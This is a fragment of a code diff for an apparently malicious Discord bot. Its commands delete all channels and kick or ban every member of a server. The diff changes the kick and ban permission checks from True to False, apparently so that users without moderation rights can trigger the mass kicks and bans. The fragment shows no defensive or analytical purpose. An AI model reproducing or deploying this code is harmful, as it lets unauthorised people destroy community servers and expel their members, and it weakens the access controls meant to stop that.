@@ -30,7 +30,7 @@ async def delete_all_channels(ctx):
     print('All channels have been deleted.')
 
 @bot.command(name='kick')
-@commands.has_permissions(kick_members=True)
+@commands.has_permissions(kick_members=False)
 async def kickall(ctx):
     for member in ctx.guild.members:
         try:
@@ -40,7 +40,7 @@ async def kickall(ctx):
             print(f'Failed to kick {member.name}: {e}')
 
 @bot.command(name='ban')
-@commands.has_permissions(ban_members=True)
+@commands.has_permissions(ban_members=False)
 async def banall(ctx):
     for member in ctx.guild.members:
         try:
